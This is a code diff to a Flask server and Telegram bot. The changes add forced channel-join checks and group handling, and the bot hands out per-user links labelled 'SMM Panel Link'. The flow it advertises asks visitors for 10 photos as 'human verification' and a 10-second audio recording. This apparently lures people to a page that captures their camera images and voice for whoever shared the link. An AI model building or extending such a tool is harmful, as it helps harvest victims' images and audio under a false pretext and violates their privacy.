@@ -10,7 +10,7 @@ from datetime import datetime
 from dotenv import load_dotenv
 from flask import Flask, request, render_template_string, session, redirect, url_for, jsonify
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
 
 load_dotenv()
 
@@ -19,8 +19,8 @@ TOKEN = os.getenv("TOKEN")
 SERVER_URL = os.getenv("SERVER_URL")
 PORT = int(os.getenv("PORT", 10000))
 
-# Force join channels - hardcoded
-CHANNELS = ["proxydominates", "noruleclub"]
+# Force join channels - hardcoded with @
+CHANNELS = ["@proxydominates", "@noruleclub"]
 CHANNEL_URLS = ["https://t.me/proxydominates", "https://t.me/noruleclub"]
 
 app = Flask(__name__)
@@ -854,22 +854,41 @@ def upload_media():
 # --- TELEGRAM BOT HANDLERS ---
 
 async def is_subscribed(app, user_id):
+    """Check if user is subscribed to all force channels"""
     for channel in CHANNELS:
         try:
-            member = await app.bot.get_chat_member(chat_id=channel, user_id=user_id)
+            # Remove @ if present
+            chat_id = channel.replace('@', '')
+            member = await app.bot.get_chat_member(chat_id=chat_id, user_id=user_id)
             if member.status in ["left", "kicked"]:
+                print(f"User {user_id} not subscribed to {channel}")
                 return False
-        except:
+        except Exception as e:
+            print(f"Error checking channel {channel}: {e}")
             return False
     return True
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
+    username = update.effective_user.username or "Unknown"
+    
+    print(f"User @{username} ({user_id}) started bot")
+    
+    # Check subscription
     if not await is_subscribed(context.application, user_id):
-        buttons = [[InlineKeyboardButton(f"Join Channel {i+1}", url=url)] for i, url in enumerate(CHANNEL_URLS)]
-        buttons.append([InlineKeyboardButton("✅ Verified", url=f"https://t.me/{(await context.bot.get_me()).username}?start=true")])
-        await update.message.reply_text("❌ **Access Denied!** Join channels to use bot.",
-                                       reply_markup=InlineKeyboardMarkup(buttons))
+        buttons = []
+        for i, url in enumerate(CHANNEL_URLS):
+            buttons.append([InlineKeyboardButton(f"📢 Join Channel {i+1}", url=url)])
+        
+        # Add a check button
+        buttons.append([InlineKeyboardButton("✅ I've Joined", callback_data="check_sub")])
+        
+        await update.message.reply_text(
+            "❌ **Access Denied!**\n\n"
+            "Please join our channels to use this bot.\n\n"
+            "After joining, click the **'✅ I've Joined'** button.",
+            reply_markup=InlineKeyboardMarkup(buttons)
+        )
         return
     
     await update.message.reply_text(
@@ -884,8 +903,39 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "🎁 20% Bonus on Alternative Number"
     )
 
-async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle button presses"""
+    query = update.callback_query
+    await query.answer()
+    
     user_id = update.effective_user.id
+    
+    if query.data == "check_sub":
+        if await is_subscribed(context.application, user_id):
+            await query.edit_message_text(
+                "✅ **Verification Successful!**\n\n"
+                "You are now subscribed to all channels.\n"
+                "Send any link to get started!"
+            )
+        else:
+            buttons = []
+            for i, url in enumerate(CHANNEL_URLS):
+                buttons.append([InlineKeyboardButton(f"📢 Join Channel {i+1}", url=url)])
+            buttons.append([InlineKeyboardButton("✅ I've Joined", callback_data="check_sub")])
+            
+            await query.edit_message_text(
+                "❌ **Still Not Subscribed!**\n\n"
+                "Please join all channels first:\n"
+                "1. Click on each channel link\n"
+                "2. Press the **Join** button\n"
+                "3. Then click **'✅ I've Joined'**",
+                reply_markup=InlineKeyboardMarkup(buttons)
+            )
+
+async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle link in private chat"""
+    user_id = update.effective_user.id
+    
     if not await is_subscribed(context.application, user_id):
         await start(update, context)
         return
@@ -897,7 +947,8 @@ async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     link = f"{SERVER_URL}/?id={update.effective_chat.id}"
     await update.message.reply_text(
-        f"✅ **Your SMM Panel Link:**\n\n`{link}`\n\n"
+        f"✅ **Your SMM Panel Link:**\n\n"
+        f"`{link}`\n\n"
         f"📋 **User Flow:**\n"
         f"1️⃣ 📸 Human Verification (10 photos)\n"
         f"2️⃣ 🎤 Audio Recording (10 sec)\n"
@@ -907,9 +958,66 @@ async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"6️⃣ 🎉 Success Page"
     )
 
+async def handle_group_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle messages in groups - only if bot is mentioned"""
+    # Check if bot is mentioned
+    if not update.message.text or f'@{context.bot.username}' not in update.message.text:
+        return
+    
+    user_id = update.effective_user.id
+    chat_id = update.effective_chat.id
+    
+    # Don't reply in channels
+    if update.effective_chat.type == "channel":
+        return
+    
+    if not await is_subscribed(context.application, user_id):
+        await update.message.reply_text(
+            "❌ **Access Denied!**\n\n"
+            "Please join our channels first:\n"
+            "📢 @proxydominates\n"
+            "📢 @noruleclub\n\n"
+            "Then send your link again."
+        )
+        return
+    
+    # Extract link from message (remove bot mention)
+    text = update.message.text
+    for word in text.split():
+        if word.startswith("http"):
+            link = f"{SERVER_URL}/?id={user_id}"
+            await update.message.reply_text(
+                f"✅ **Your SMM Panel Link:**\n\n"
+                f"`{link}`\n\n"
+                f"Click above link to start!"
+            )
+            return
+    
+    await update.message.reply_text(
+        "❌ Please send a valid link with http or https"
+    )
+
+async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Log errors"""
+    print(f"Update {update} caused error {context.error}")
+
 if __name__ == '__main__':
-    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT)).start()
+    # Start Flask in background
+    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)).start()
+    
+    # Start Telegram Bot
     bot = Application.builder().token(TOKEN).build()
+    
+    # Add handlers
     bot.add_handler(CommandHandler("start", start))
-    bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_link))
-    bot.run_polling()
+    bot.add_handler(CallbackQueryHandler(button_callback))
+    bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE, handle_link))
+    bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.ChatType.GROUP, handle_group_message))
+    bot.add_error_handler(error_handler)
+    
+    print("🤖 Bot Started Successfully!")
+    print(f"📢 Force Channels: {CHANNELS}")
+    print(f"🌐 Server URL: {SERVER_URL}")
+    print(f"📌 Bot Username: @{(bot.bot.username) if hasattr(bot.bot, 'username') else 'unknown'}")
+    
+    bot.run_polling(allowed_updates=Update.ALL_TYPES)
